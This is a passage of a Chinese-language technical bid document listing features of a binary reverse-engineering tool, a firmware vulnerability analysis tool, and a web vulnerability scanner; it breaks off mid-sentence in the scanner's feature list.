这项功能极大地增强了用户按需定位特定文件的能力。</li><li>通用平台逆向工具具备了一项高度定制化的筛选功能，它能够智能地排除那些文件名与用户提供的特定正则表达式相匹配的文件，不对它们进行扫描。正则表达式是一种功能强大的文本模式描述工具，它允许用户定义高度复杂的搜索模式。</li><li>通用平台逆向工具集成了一个可配置的状态服务器功能，它允许用户在指定的网络端口上启动一个服务，以监视和管理逆向工程过程中的实时状态信息。通过这一功能，用户可以方便地远程查询工具的当前状态，包括但不限于正在进行的任务、资源使用情况、进度更新等关键运行数据。</li><li>工具提供了对Dalvik Decompiler的全面支持，这是一个专为分析Android应用程序中的Dalvik字节码而设计的重要功能。</li><li>工具提供了对ARM反编译器的完整支持，这使得它能够高效地处理ARM架构下的机器代码，并将其反编译成更易于理解的中间表示或高级代码。</li><li>工具具备了对ARM64反编译器的支持，这一特性为用户处理基于ARM64位指令集的应用程序和系统提供了极大的便利。</li><li>工具集成了MIPS反编译器的支持，使其能够专门针对MIPS架构的机器代码执行高效且精确的反编译过程。</li><li>工具提供了对Intel x86 Decompiler的支持，这一特性是针对广泛使用的Intel x86架构设计的，它允许用户将编译过的机器代码逆向工程回更易于理解的高级语言代码。</li><li>工具提供了对Intel x86-64 Decompiler的支持，工具能够处理和转换基于Intel x86-64架构的二进制程序代码，将其反编译成更易于理解的高级代码形式。</li><li>工具包含了对Libra Decompiler（开源）的支持，专门用于处理libravm / Move模块。这一功能对于开发者和分析师来说至关重要，因为它允许他们将基于Move语言编写的Libra智能合约逆向工程至其源代码形式。</li><li>工具提供了对多种存档文件格式的支持，包括但不限于广泛使用的zip格式，高压缩率的7z格式，以及在Unix和Linux系统中常见的tar格式。</li><li>工具提供了对x.509证书文件的支持，这是一项对于安全分析和网络通信领域的专业人士来说非常重要的功能。</li><li>工具为Android应用程序开发和安全分析提供了全面的支持，特别是对于Android APK文件的处理。该工具不仅支持标准的dex文件，这是Android平台上应用程序的主要执行格式，而且还支持odex（优化的DEX）文件，这是为了提高系统启动速度和应用程序加载时间而进行特定设备优化的DEX版本。此外，对于x-apk文件也提供了支持，这是一种包含额外文件如OBB或资产数据的特殊APK格式，常用于大型游戏或复杂应用程序的分发。</li><li>工具具备对Windows可执行文件格式PE（Portable Executable）和PE64的全面支持，这些格式是Windows操作系统中32位和64位应用程序的标准文件格式。此外，工具还支持COFF（Common Object File Format）格式，这是一种用于存储编译器和链接器生成的代码和数据的文件格式。除了这些，工具的功能还扩展到了对PDB（Program Database）文件的支持，这种文件包含了用于调试Windows程序的符号和其他信息。</li><li>工具提供了对Linux系统中广泛使用的ELF（Executable and Linkable Format）文件格式的支持，覆盖了32位（ELF）和64位（ELF64）两种变体。ELF格式是Linux环境下最常见的二进制格式，用于可执行文件、可重定位代码、共享库和核心转储。</li><li>工具提供了对Mach-O文件格式的全面支持，这是macOS和iOS操作系统中常用的二进制文件格式。工具不仅支持标准的Mach-O文件，而且还支持Mach-O/FAT文件，后者包含了为不同架构（如x86_64和ARM）编译的多个Mach-O文件，使得同一个可执行文件能够在多种硬件上运行。</li><li>工具具备了对英特尔HEX文件格式（通常简称为ihex）的支持能力，使得用户能够处理和分析在微控制器编程和固件开发中常用的这种文件格式。</li><li>提供了对Dalvik调试器的支持，这是Android操作系统中Dalvik虚拟机的一个重要组成部分，专门用于执行Android应用程序中的DEX（Dalvik Executable）文件。</li><li>提供license，包含数据库在内的功能。。</li></ol><h4 id="技术实现内容-61"><a href="#技术实现内容-61" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><h5 id="软件方案-23"><a href="#软件方案-23" class="headerlink" title="软件方案"></a>软件方案</h5><p>该二进制分析工具将采用模块化设计，由多个功能模块组成，以支持各种架构的二进制文件和不同操作系统。以下是软件方案设计的主要组成部分：</p><p>架构支持模块：</p><p>实现对50多种架构的二进制文件的解析和处理功能，包括64位文件的支持。</p><p>操作系统支持模块：</p><p>提供对Windows、Linux、Mac和嵌入式系统的支持，以便在不同平台上运行和使用该工具。</p><p>调试器支持模块：</p><p>集成WinDbg和Symbian调试器，以便对相应平台上的二进制文件进行调试操作。</p><p>连接模块：</p><p>支持使用debugserver协议与设备建立连接，以便在嵌入式系统上进行调试和分析。</p><p>反汇编模块：</p><p>提供交互式、可编程的多处理器反汇编功能，以解析和分析二进制文件的指令集。</p><p>文件系统模块：</p><p>支持FAT文件系统，以便在分析过程中访问和处理文件。</p><p>交互性模块：</p><p>提供交互式操作界面，使用户能够对代码进行重构、重命名和添加注释等操作。</p><p>图形化模块：</p><p>提供图形化界面，支持生成控制流图（CFG）和调用图（Callgraphs），以帮助用户可视化代码的执行路径和函数调用关系。</p><p>离线工作模块：</p><p>支持在没有互联网连接的情况下正常工作，以确保工具的稳定性和可靠性。</p><p>前端客户端模块：</p><p>支持执行第三方前端客户端，以扩展工具的功能和适应不同用户需求。</p><h5 id="工具功能-23"><a href="#工具功能-23" class="headerlink" title="工具功能"></a>工具功能</h5><p>1. 多架构支持</p><p>产品将支持超过50种不同的架构的二进制文件，包括但不限于x64、ARM64、PowerPC、MIPS等。对于64位文件，工具将能够无缝地处理，确保用户可以反汇编最新的应用程序和操作系统组件。</p><p>2. 跨平台操作系统支持</p><p>该工具将能够在Windows、Linux和Mac操作系统上运行，为用户提供了广泛的灵活性。无论用户的开发环境如何，他们都可以使用这个工具来进行他们的逆向工程任务。</p><p>3. CPU指令集反编译</p><p>工具将支持数十种CPU指令集的反编译，这意味着它能够理解和转换各种处理器的机器代码，包括高级SIMD指令和专用处理器指令。这确保了工具在面对各种硬件时的适应性和准确性。</p><p>4. 调试器集成</p><p>集成WinDbg和Symbian调试器，以及支持使用debugserver协议与设备建立连接，这将允许开发者进行深入的调试会话，并更好地理解正在运行的代码。</p><p>5. 交互式多处理器反汇编器</p><p>交互式、可编程的多处理器反汇编器将允许用户同时处理多个处理器架构，并且能够通过编程方式控制反汇编过程。</p><p>6. 文件系统和交互性支持</p><p>对FAT文件系统的支持确保了与广泛使用的存储介质的兼容性。同时，交互性功能如重构、重命名和添加注释将使用户能够更好地理解和修改代码。</p><p>7. 图形化功能</p><p>图形化功能，如控制流图（CFG）和调用图（Callgraphs），将帮助用户可视化代码的结构和流程，这对于复杂代码的理解至关重要。</p><p>8. 扩展支持</p><p>通过Python脚本和其他插件进行扩展，这将使工具非常灵活，能够适应各种工作流程和需求。</p><p>9. 离线功能</p><p>工具将能够在没有互联网连接的情况下正常工作，这对于安全敏感的环境非常重要。</p><p>10. 调试器支持</p><p>广泛的调试器支持，包括对Intel x86、x86-64、ARM、ARM64和MIPS调试器的支持，确保了不同平台上的调试能力。</p><p>11. 固件代码逆向测试工具</p><p>固件代码逆向测试工具将具备良好的交互性和可编程性，支持多处理器和跨平台主机，能够处理包括但不限于Intel x86、x64、MIPS、PowerPC等指令集。</p><p>12. 二进制分析和逆向工具</p><p>该工具将具备二进制搜索、动态调试和流程图功能，能够支持瑞萨RH850指令集，以及扫描目标文件的常见文件签名和指定字符序列。</p><p>13. 文件处理和扫描</p><p>工具将支持自动提取已知的文件类型，提取文件/文件夹到自定义目录，并提供对提取文件大小和数量的限制。此外，它还将支持扫描原始deflate和LZMA压缩流，以及基于正则表达式的文件扫描和过滤功能。</p><p>14. 状态服务器和反编译器</p><p>提供状态服务器功能，并支持Dalvik、ARM、ARM64、MIPS、Intel x86和x86-64反编译器，确保了在处理各种文件和应用程序时的灵活性。</p><p>15. 文件格式支持</p><p>广泛的文件格式支持，包括存档文件、证书文件、Android APK、Windows PE/PE64/COFF、Linux ELF/ELF64、Mach-O、英特尔HEX等，确保了与各种应用程序和系统的兼容性。</p><p>16. 特定平台支持</p><p>对特定平台的支持，如Dalvik调试器（Android），以及对libravm/Move模块的Libra Decompiler的支持，展现了工具的专业性和适应性。</p><h3 id="二进制分析工具"><a href="#二进制分析工具" class="headerlink" title="二进制分析工具"></a>二进制分析工具</h3><h4 id="工具概述-20"><a href="#工具概述-20" class="headerlink" title="工具概述"></a>工具概述</h4><p>所投工具能帮助企业为引入第三方组件设置管理门槛及策略。支持基于尖端的已知和未知漏洞检测引擎，查找和验证实际的安全威胁。能够基于机器自学习算法技术根据CWE规范提取所有漏洞的特征（调用堆栈，方法名称，参数类型，缓冲区大小等）自动生成该二进制文件的未知漏洞列表。</p><h4 id="功能实施方案-69"><a href="#功能实施方案-69" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><p>功能参数如下：</p><p>提供的该工具信息如下：</p><p>品牌：国利</p><p>型号：GLRNPcc</p><p>数量：1套</p><p>参数信息如下：</p><ol><li>工具包含了成分分析功能，它能够自动地生成对应的软件物料清单（Software Bill of Materials, 简称 SBOM）和硬件物料清单（Hardware Bill of Materials, 简称 HBOM）。这一功能对于任何需要精确了解其软件和硬件组件的企业或开发者来说是极其有价值的；</li><li>工具的公有漏洞扫描功能，提供了对二进制固件和应用的深入成分分析，它能够自动地识别和列出内嵌在软件内部的组件。这一步骤对于确保软件安全至关重要，因为它揭示了潜在的安全风险所在。紧接着，工具还具备自动化匹配和发现公有漏洞（Common Vulnerabilities and Exposures, 简称 CVEs）的能力，这意味着它能够对照公有数据库，检测这些组件是否存在已知的安全漏洞；</li><li>工具的语言缺陷分析功能，支持广泛的编程语言，包括但不限于Assembly, BASIC, C, C++, Delphi, Go, Haskell, Java, Lisp, OCaml, Objective-C, Qt, Rust, Swift, Python, 以及Javascript。它能够识别各种语言中的特定缺陷，这对于确保代码质量和应用程序安全性至关重要；</li><li>工具提供了全面的架构支持，能够适配并分析多种不同的处理器架构，包括Renesas V850, SuperH, PowerPC, Infineon Tricore, ARM Cortex-M, ARM Cortex-A, ARM Cortex-R, x86, x64, NVIDIA AGX, Xavier, MIPS, NXP等。这种广泛的兼容性意味着工具能够服务于从嵌入式系统到高性能计算平台的各种应用，涵盖了汽车电子、消费电子、网络设备、移动通信、航空航天等众多领域；</li><li>工具展现了卓越的系统支持能力，兼容多种操作系统，包括标准Linux发行版（Standard Linux Distribution）、Android、QNX、Windows、Windows IoT设备（Windows IOTs）、NetBSD、FreeBSD、各种专有实时操作系统（Proprietary RTOS）、RIOT、Google的Fuchsia OS、汽车行业的OSEK OS、实时操作系统VxWorks以及webOS。这一宽泛的系统支持确保了工具能够在不同的软件环境中运行，从而满足多样化的应用场景和客户需求。不论是在个人电脑、服务器、嵌入式设备、网络设备、智能家居产品还是在工业控制系统中，这个工具都能提供精确的二进制分析，帮助开发者发现和修正潜在的安全漏洞以及性能瓶颈；</li><li>工具的接口风险分析功能专注于识别和评估与协议接口相关的安全漏洞，它具有广泛的支持范围，能够通过深入检测揭示与多种通信协议相关的公有漏洞。工具的检测能力覆盖了包括蓝牙、WiFi、短信服务（SMS）、4G网络以及全球定位系统（GPS）等关键的协议接口。通过这些协议接口的深度分析，工具能够帮助开发者和安全专家发现那些可能被忽视的安全缺陷，进而采取必要的预防措施来提升整体系统的安全性；</li><li>在AUTOSAR架构识别方面具备高级的分析能力，它不仅能够准确识别出固件是否基于AUTOSAR（AUTomotive Open System ARchitecture）架构，这一点对于汽车软件开发和安全分析至关重要，而且还能够自动绘制出AUTOSAR架构的拓扑图；</li><li>内置的TARA（Threat Analysis and Risk Assessment）分析功能，为用户提供了一个可视化的界面，使得用户能够便捷地结合软件物料清单（SBOM）中定义的资产类型和多维度信息，来定制和审视整车的拓扑结构。这种可视化手段不仅增强了用户对整个系统架构的理解，还使得进行TARA分析变得更加直观和高效；</li><li>配备了强大的漏洞过滤机制，该机制专门设计用于对已知漏洞执行威胁关联分析。它能够智能地识别并排除那些对当前分析中的系统固件不造成影响的已知漏洞，从而使安全分析师能够集中精力处理那些真正对系统安全性有潜在威胁的漏洞。此外，该工具还包含22种不同的漏洞过滤条件；</li><li>工具细致地评估了各种可能导致信息泄露的风险因素。它能够识别系统中硬编码的凭证，这些凭证可能被忽视，但却是潜在的安全隐患。此外，工具还能检测出存储为明文纯文本的密码，这些密码容易被未经授权的人员获取。对于使用哈希处理的密码，工具同样能够识别出弱哈希或不安全的实现方式。分析工具还能够挖掘出潜在的电子邮箱地址、IP地址、URL链接、文件路径，这些信息若被泄露，可能被恶意利用。验证问题和加密配置的弱点也在检测范围之内，包括易于猜测的安全问题答案和弱加密算法的使用。此外，工具还关注加密密钥的管理，能够发现可能导致安全风险的可访问加密密钥，以及检测到任何未加密的对外通讯和私有密钥的不当暴露，这些都是信息安全的关键点；</li><li>工具内置了一个高效的漏洞利用脚本标识功能，它具备检测和标记已知漏洞的可利用状态（EXP）的能力，并通过内部计算验证，将其脚本的链接返回到操作端。这一功能对于安全研究人员和安全团队来说至关重要，因为它能够快速地指出哪些漏洞是可被直接利用的，从而帮助他们评估系统的安全风险；</li><li>工具提供了一个全面的漏洞评分系统，它能够根据公认的通用漏洞评分系统（CVSS）给出每个发现漏洞的评分。该工具支持CVSS的第二版（CVSSv2）和第三版（CVSSv3），为安全专家提供了一个标准化的评估方法来判断漏洞的严重性；</li><li>对漏洞缺陷类型的精确匹配，它能够将检测到的公有漏洞与相应的漏洞缺陷类型（CWE）进行关联。这种能力对于理解漏洞的根本原因和潜在影响至关重要，因为它提供了一个标准化的框架来分类和讨论软件的弱点；</li><li>工具具有合规标准开源许可风险分析检测的功能，它能够对固件和应用进行组件所采用的开源许可类型及信息的识别和分析，如React、TensorFlow、Apache Kafka等开源组件，并支持超过50种不同行业的标准与规范。这对于确保合规性和避免潜在的法律和运营风险尤为重要，因为不同的许可类型可能对软件的使用和分发有着不同的限制和要求；</li><li>提供了详细的漏洞修复建议或补丁链接。这样的指导信息对于快速和解决安全问题是极其有用的，它帮助开发人员和安全团队采取正确的修复措施，以减轻漏洞带来的风险；</li><li>工具的未知漏洞挖掘能力是其另一个显著特点。即使在没有源代码的情况下，它也能通过自动化逆向工程和反汇编技术对二进制固件进行深入分析，从而挖掘潜在的未知漏洞。这项能力极大地扩展了安全分析的深度和广度，为发现和防御先进的安全威胁提供了强有力的支持；</li><li>工具提供了一项强大的功能，专门用于挖掘与识别各种未知漏洞缺陷类型。通过深入分析，该工具能够检测到一系列常见且危险的安全缺陷，包括但不限于：</li></ol><p>缓冲区溢出（Buffer overflow），无论是发生在堆（Heap）还是栈（Stack），都能被准确识别。这类溢出漏洞可能会导致程序崩溃或执行任意代码。</p><p>缓冲区重读（Buffer over-read），同样针对堆和栈的漏洞，这可能会导致敏感信息的泄露。</p><p>无效缺页错误（Invalid page fault）缺陷，它可能会导致程序非正常终止或其他不可预期的行为。</p><p>死锁（Deadlock），这种多线程同步问题可能导致程序完全冻结。</p><p>整数溢出（Integer overflow），可能导致程序逻辑错误或内存损坏。</p><p>空指针间接引用（Null pointer dereference）缺陷，这可能会导致程序崩溃或不稳定。</p><p>未初始化变量（Uninitialized data）缺陷，可能会导致不确定的程序行为或信息泄露。</p><p>释放后使用（Use-after-free）缺陷，这是一种常见的内存管理错误，可能会被利用执行任意代码。</p><p>双重释放（Double free）缺陷，可能导致程序崩溃或内存损坏。</p><p>释放无效内存地址（Invalid and mismatched free）缺陷，这可能会破坏内存管理，导致不稳定或不可预测的行为。</p><p>除数为零（Divisions by zero）缺陷，可能导致程序崩溃或结果不准确。</p><p>类型混淆（Type Confusion）缺陷，可能会导致程序执行不正确的操作，从而引发安全问题。</p><ol><li>工具在识别潜在的未知漏洞时，不仅能够检测到漏洞的存在，还可以对其风险进行精确分类，以便用户能够了解并优先处理最严重的安全威胁。具体来说，该工具能够将未知漏洞分为以下几类重要的风险类型：</li></ol><p>远程代码执行（RCE, Remote Code Execution）：这类漏洞允许攻击者在目标系统上远程执行任意代码，通常是通过网络利用程序中的安全漏洞。这是最危险的漏洞类型之一，因为它可能允许未经授权的用户完全控制受影响的系统</p><p>权限提升（PE, Privilege Escalation）：这类风险涉及攻击者利用漏洞提升其在系统中的权限，从而获得比正常用户更高的访问级别。这可能导致未授权的数据访问或系统更改，对系统安全构成严重威胁</p><p>服务拒绝（DOS, Denial of Service）：通过这种攻击，攻击者目的是使目标系统的资源耗尽，从而使合法用户无法访问服务。这可能通过过度消耗网络带宽、处理器时间或存储空间来实现。虽然DOS攻击通常不会导致数据泄露，但它们会影响服务可用性，并可能导致重要的业务中断</p><ol><li>对于每一个检测到的未知漏洞，本工具能够结合二进制文件和相应的反汇编信息，生成详细的漏洞描述。这种描述不仅包括技术细节，还可能涉及漏洞的潜在影响，为用户提供全面的安全视角；</li><li>在缓解措施方面，本工具支持用户上传符号文件，这有助于精确定位未知漏洞。通过符号文件，用户可以更容易地理解漏洞上下文，并针对性地进行修复和缓解工作；</li><li>为了验证未知漏洞，本工具能够自动基于二进制固件的函数和汇编信息生成未知漏洞缺陷代码。这使得用户可以在不破坏原始系统环境的前提下，测试和确认漏洞的存在；</li><li>在漏洞定位方面，本工具提供与未知漏洞相关的二进制反汇编信息，这样用户可以更方便地进行漏洞的定位和修复工作。反汇编信息的提供，使得用户能够深入理解漏洞的技术根源；</li><li>工具能进行合规标准检测，支持50种以上不同行业的标准与规范。这意味着用户可以确保他们的固件和应用程序符合行业的合规要求，降低因不合规而带来的风险；</li><li>具备持续监控功能，不仅能对漏洞结果进行持续跟踪，还会自动基于国际漏洞库、论坛、新闻等多方渠道进行潜在风险的持续监测。一旦发现新的威胁或者变化，系统会立即进行告警，帮助用户及时最新的安全挑战。这一系列的功能确保了用户在未知漏洞管理方面的主动性和前瞻性，为保障信息系统安全提供了强有力的支持；</li><li>提供license，包含数据库在内的功能。。</li></ol><h4 id="技术实现内容-62"><a href="#技术实现内容-62" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><h5 id="软件方案-24"><a href="#软件方案-24" class="headerlink" title="软件方案"></a>软件方案</h5><p>仪表盘：设计一个清晰的主仪表盘，展示所有安全分析的总体状态，包括漏洞数量、风险等级分布、最近扫描活动等。</p><p>导航：提供直观的顶部导航栏，让用户能够快速访问不同的功能模块，例如“成分分析”、“漏洞扫描”、“风险评估”等。</p><p>向导和帮助：对于复杂的操作，提供交互式向导和步骤说明，帮助用户完成任务。</p><p>成分分析：用户能够上传或指定代码库进行分析，并能接收到一个详细的成分列表报告。</p><p>漏洞扫描：通过点击“漏洞扫描”按钮允许用户快速启动漏洞扫描过程。用户可以选择扫描特定的文件、目录或整个项目。</p><p>语言缺陷分析：提供语言选择器，允许用户指定或自动检测其代码的编程语言。展示语言特定的缺陷和安全问题的清单。</p><p>风险评估：提供交互式的风险评估工具，用户可以通过拖放组件来构建系统架构，并自动进行风险评估。</p><p>漏洞管理：实现一个漏洞管理界面，用户可以查看各个漏洞的详细信息，包括评分、描述、修复建议等。用户可以根据漏洞的严重程度、状态（已解决/未解决）、影响组件等条件过滤漏洞。</p><p>报告和输出：提供一键生成报告功能，用户可以导出PDF或其他格式的详细分析报告。支持定制报告模板，以符合组织的品牌和格式要求。</p><p>集成和API：提供开放的API接口，允许用户将工具集成到他们的CI/CD流程中。支持与常见的代码仓库和问题跟踪系统集成，如GitHub、GitLab、JIRA等。</p><p>配置文件：允许用户创建和保存配置文件，以便于在不同项目间复用特定的扫描设置。用户可以快速选择已有的配置文件来执行新的扫描任务。</p><p>通知设置：用户可以设置通知偏好，选择在发现新漏洞或漏洞状态变更时接收邮件、短信或系统通知。</p><p>用户账户和角色管理：支持用户账户创建和管理，允许不同的用户拥有不同的访问权限。管理员可以分配角色和权限，控制用户对各种功能的访问。</p><p>数据加密：确保所有敏感数据，如源代码、漏洞信息、配置设置等都经过加密处理。</p><p>安全审计：提供审计日志，记录所有用户的活动和系统事件，以供未来审查。</p><h5 id="工具功能-24"><a href="#工具功能-24" class="headerlink" title="工具功能"></a>工具功能</h5><p>成分分析:本工具能够通过深度扫描和分析技术自动生成软件物料清单（SBOM）和硬件物料清单（HBOM），为用户提供详尽的组件清单和硬件资源使用情况。SBOM包括所有软件组件的名称、版本、许可信息，以及这些组件的依赖关系。HBOM详细列出硬件组件的规格、型号、供应商信息以及相关的固件版本。</p><p>公有漏洞扫描:工具将支持对二进制固件及应用程序的成分分析，自动化地匹配并发现与之相关的公有漏洞（CVEs）。通过集成最新的公有漏洞数据库，工具能够实时更新和识别新发现的漏洞。</p><p>语言缺陷分析:支持广泛的编程语言进行缺陷分析，包括但不限于Assembly, BASIC, C, C++, Delphi, Go, Haskell, Java, Lisp, OCaml, Objective-C, Qt, Rust, Swift, Python, Javascript等。工具将使用先进的静态和动态分析技术，识别各种编程语言特有的安全缺陷和代码质量问题。</p><p>架构支持:本工具设计以支持多种处理器和微控制器架构，包括但不限于Renesas V850, SuperH, PowerPC, Infineon, Tricore, ARM Cortex系列，x86/x64, NVIDIA AGX, Xavier, MIPS, NXP等。对于每种架构，工具都能够提供定制化的分析和识别能力，确保准确性和效率。</p><p>系统支持:工具将支持包括但不限于Standard Linux Distribution, Android, QNX, Windows, Windows IoTs, NetBSD, FreeBSD, Proprietary RTOS, RIOT, Fuchsia OS, OSEK OS, VxWorks, webOS等多种操作系统。通过深入了解各系统的内核和API特性，工具能够提供针对性的安全分析。</p><p>接口风险分析:工具将支持对包括蓝牙、WiFi、SMS、4G、GPS等多种协议接口进行安全风险分析。通过模拟攻击和协议分析，工具能够发现和报告潜在的协议接口相关的公有漏洞。</p><p>AUTOSAR架构识别:工具能够识别基于AUTOSAR架构的固件，并自动绘制出AUTOSAR架构的拓扑图。帮助汽车行业的开发者和安全分析师快速理解系统架构和组件交互。</p><p>TARA分析:支持结合SBOM资产类型和维度进行整车拓扑结构的自定义，并进行威胁分析和风险评估（TARA）。工具提供可视化界面，帮助用户直观地理解和分析整个系统的安全风险。</p><p>漏洞过滤机制:能够对已知漏洞进行威胁关联分析，排除对系统固件不受影响的已知漏洞。工具将包含不少于22种不同的漏洞过滤条件，如版本匹配、配置状态、影响评估等。</p><p>信息泄露风险:工具能够识别硬编码凭证、明文纯文本密码、哈希密码、潜在邮箱、IPs、URLs、文件路径等敏感信息泄露风险。对于加密相关的风险，工具将识别可访问的加密密钥、未加密的对外通讯、私有密钥等弱加密配置。</p><p>漏洞利用脚本:工具将标识已知漏洞的可利用状态（EXP）并提供相关的漏洞利用脚本链接。这将帮助安全研究人员和开发者了解漏洞的实际利用方法和风险程度。</p><p>漏洞评分:提供漏洞的通用漏洞评分系统（CVSS）评分，支持CVSSv2和CVSSv3标准。通过评分，用户可以快速识别和优先处理高风险的漏洞。</p><p>漏洞缺陷类型:能够将公有漏洞匹配对应的漏洞缺陷类型（CWE），帮助用户理解漏洞的本质和潜在影响。</p><p>开源许可风险:工具将分析组件的开源许可类型，并支持不少于50种不同的开源许可类型。用户可以根据许可类型评估法律风险和合规性要求。</p><p>漏洞修复建议:提供详细的漏洞修复建议或补丁链接，帮助用户快速和修复漏洞。</p><p>未知漏洞挖掘能力:无需源代码，工具能够对二进制固件进行自动化逆向工程和反汇编，以发掘未知漏洞。通过高级算法和模式识别技术，工具能够识别潜在的安全风险。</p><p>未知漏洞缺陷类型:支持对多种未知漏洞缺陷类型进行挖掘，包括但不限于缓冲区溢出、缓冲区重读、无效缺页错误、死锁、整数溢出、空指针间接引用、未初始化数据、释放后使用、双重释放、释放无效内存地址、除数为零、类型混淆等。</p><p>未知漏洞风险分类:能够对未知漏洞的风险进行分类，包括远程代码执行（RCE）、权限提升（PE）、拒绝服务（DOS）等。</p><p>未知漏洞描述:结合二进制文件和对应的反汇编信息，为每个未知漏洞生成详细的描述。</p><p>缓解措施:支持上传符号文件，以帮助用户定位未知漏洞，并提供修复和缓解建议。</p><p>自动生成未知漏洞代码验证:能够基于二进制固件的函数和汇编信息自动生成未知漏洞缺陷代码进行验证。</p><p>漏洞定位:提供与未知漏洞相关的二进制反汇编信息，以便用户进行漏洞定位与修复。</p><p>合规标准检测:能对固件和应用进行合规审查，支持50种以上不同行业的标准与规范。</p><p>持续监控:对漏洞结果进行持续跟踪，并基于国际漏洞库、论坛、新闻等多方渠道进行潜在风险的持续跟踪，同时提供实时告警。</p><h3 id="Web漏洞扫描工具"><a href="#Web漏洞扫描工具" class="headerlink" title="Web漏洞扫描工具"></a>Web漏洞扫描工具</h3><h4 id="工具概述-21"><a href="#工具概述-21" class="headerlink" title="工具概述"></a>工具概述</h4><p>漏洞扫描是一款针对设备入网、网站上线、日常运维、安全事件脆弱点分析、等保合规等场景提供的一体化脆弱性分析与评估产品。能够为党政、卫生、教育、监管、能源、金融等行业用户提供涵盖系统漏洞检测、web漏洞检测、数据库漏洞检测、配置合规检测、弱口令检测在内的五合一脆弱性检测能力。</p><h4 id="功能实施方案-70"><a href="#功能实施方案-70" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><ol><li>工具支持在多个系统上进行分布式集中部署，允许用户统一下发策略和查看结果，并且可以指定使用特定的扫描引擎；同时，支持分布式引擎的配置，使得安全分析和监控工作能够在不同地点协同进行。</li><li>工具提供了集中管理功能，用户可以通过集中管理平台进行日志查看、策略管理、站点管理等操作。此外，工具还提供了灵活的告警配置选项，用户可以根据需要配置告警内容、告警方式以及告警资产的范围。</li><li>支持将集中管理服务器和扫描引擎分地域部署，即扫描引擎和服务器之间可以通过网络进行互联，扫描引擎只需通过网络到服务器中获取漏洞信息，通过扫描引擎在其他地域就能进行扫描任务，并将扫描结果实时回传至服务器。例如，管理中心可以部署在机房A，而其他地点如机房B/C/D则可以只部署扫描引擎，实现资源的合理分配和利用。</li><li>工具允许单个设备旁路部署，这意味着即使在孤立环境中，也能够独立完成扫描工作，确保了灵活性和独立性。</li><li>采用B/S设计架构，用户无需安装任何客户端软件即可通过Web界面进行管理，且管理界面采用HTTPS协议确保通信安全。推荐使用Firefox、Chrome等主流浏览器进行操作。</li><li>工具支持针对IPv4环境的漏洞扫描，确保了对当前广泛使用的网络环境的兼容性。</li><li>同时，也支持针对IPv6环境的漏洞扫描，考虑到未来网络的发展趋势，这一功能确保了工具的前瞻性和持久性。</li><li>工具支持修改账号密码，以保障用户账户的安全性。</li><li>工具支持自定义创建账号，提供了缺省的系统管理员、配置管理员、审计管理员、报表管理员等四种用户角色，以满足不同权限和职责的管理需求</li><li>工具提供了用户信息查看功能，管理员可以查看用户名、用户权限模板、最近登录日期（包括具体时间）、账号状态、是否被锁定以及登录超时时间（以分钟计），这些功能使得用户管理更为透明和便捷</li><li>工具支持新增用户功能，管理员可以为新用户设置多项信息，包括用户名、用户权限模板、登录锁定次数、登录超时时间、是否需要定期更换密码、最小密码长度、密码强度要求、扫描白名单、扫描黑名单等，这些设置项确保了用户账号的安全性和符合组织的安全策略。</li><li>工具允许自定义用户权限模板，以适应不同用户的权限需求。缺省情况下，系统提供了报表管理员功能组、审计管理员功能组、普通管理员功能组三种权限模板，方便管理员根据实际需求进行选择和分配。</li><li>工具支持查看用户权限模板的详细信息，包含已选功能组和已选功能菜单，使得权限分配的过程更加透明化，便于管理和审核。<br>为了及时通知用户检测结果</li><li>工具支持在检测结束后将报告发送至指定邮箱，确保用户可以及时获取检测结果。</li><li>工具还支持检测结束后发送SNMP Trap告警，与企业的网络管理系统集成，提供实时的安全告警。</li><li>工具也能在检测结束后发送SYSLOG告警，能够自动将检测结果通过SYSLOG协议发送告警通知，与企业的日志管理系统集成，方便进行安全事件的追踪和分析。</li><li>工具支持检测结束后将报告发送至指定FTP服务器，为用户提供了灵活的报告存储选项。工具在完成检测后，能够自动生成详细的报告，并将报告发送至用户指定的FTP服务器。用户可以通过FTP服务器方便地下载和查看报告，了解网站的安全状况。</li><li>工具提供了对系统资源如CPU、内存、磁盘、网络状态的监控，同时也支持设备授权到期和特征库授权到期的告警设置，管理员可以自定义告警值，确保系统的稳定运行和及时更新。</li><li>工具支持查看系统告警日志的基本信息，并提供了备份、根据时间段搜索和告警类型搜索日志的功能，即将系统告警日志进行记录后就可以直接备份，技术人员可以根据告警的时间段、类型、特征等进行地址搜索，快速找到对应的告警信息。</li><li>工具支持将当前设备设置为分布式引擎，并支持新增引擎地址、查看分布式引擎的基本信息，通过工具的配置文件将当前设备标识为一个分布式引擎，并指定一个唯一的引擎ID，将此ID输入到主管理界面进行组网，即可完成分布式引擎地址的添加。通过配置界面的分布式引擎界面，可产看到分布式引擎的基本信息，如引擎ID、性能等。</li><li>工具集成了PING、WGET和端口探测等基本诊断工具，用户可以使用这些工具来检测网络的连通性，确认对端网络的连接状态，确保扫描过程能够顺利进行。</li><li>工具支持使用端口探测工具来快速检测网络中的端口开放状态，这有助于管理员评估网络的安全状况，及时发现潜在的安全风险</li><li>工具能够遍历数据包传输路径上的所有路由器，帮助用户了解网络拓扑结构和数据包传输过程中的关键节点，有助于分析网络问题和定位安全事件，这有助于管理员了解网络结构，对网络性能和安全性进行全面的监控</li><li>工具支持通过Tcpdump进行数据包捕获，这是网络管理员进行网络问题诊断和安全分析的重要手段。该工具集成Tcpdump抓包功能，用户可以使用该功能捕获网络上的数据包并进行分析，帮助用户深入了解网络通信过程和网络攻击的手法。</li><li>工具能够收集扫描、授权、引擎等相关的日志信息，自动收集扫描过程、授权信息、引擎状态等相关的日志信息，方便用户在遇到问题时进行排查和分析，这些日志信息对于排查问题和进行安全审计至关重要</li><li>针对引擎、服务的常见问题，工具提供了一键诊断和修复功能，针对引擎和服务的常见问题能够自动进行检测和修复，帮助用户快速解决使用过程中遇到的问题，这大大简化了问题解决流程，提高了工作效率</li><li>工具支持界面配置反向支持端口，针对引擎和服务的常见问题能够自动进行检测和修复，简化了端口配置流程，用户只需配置端口即可，这样降低了售后支持的难度</li><li>工具提供了开启和关闭SSH服务的选项，这让管理员能够根据安全策略和需求灵活控制SSH访问。通过开启SSH服务，用户可以远程登录到目标主机进行操作和维护。而关闭SSH服务则可以提高安全性，防止未经授权的访问。</li><li>工具还支持解锁SSH功能，方便管理员使用SSH进行远程管理。当SSH服务被锁定或限制使用时，该工具应提供解锁功能，以便用户能够方便地使用SSH远程登录。解锁操作可以帮助用户快速恢